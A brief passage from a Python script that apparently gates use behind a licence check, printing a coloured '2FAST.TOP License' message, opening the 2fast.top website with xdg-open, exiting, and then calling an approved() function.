        print(" \x1b[1;91m 2FAST.TOP License:"+id)
        os.system("xdg-open https://2fast.top")
        sys.exit()
approved()
